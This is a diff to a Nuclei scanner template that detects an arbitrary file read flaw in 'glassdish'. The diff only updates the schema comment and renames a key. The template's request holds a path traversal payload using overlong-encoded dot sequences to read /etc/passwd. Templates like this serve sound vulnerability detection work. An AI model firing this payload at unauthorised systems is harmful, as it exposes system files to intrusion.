@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: glassdish-arbitrary-file-read
 
 info:
@@ -8,7 +9,7 @@ info:
     - https://www.freebuf.com/vuls/283806.html
   tags: glassdish,file-read
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
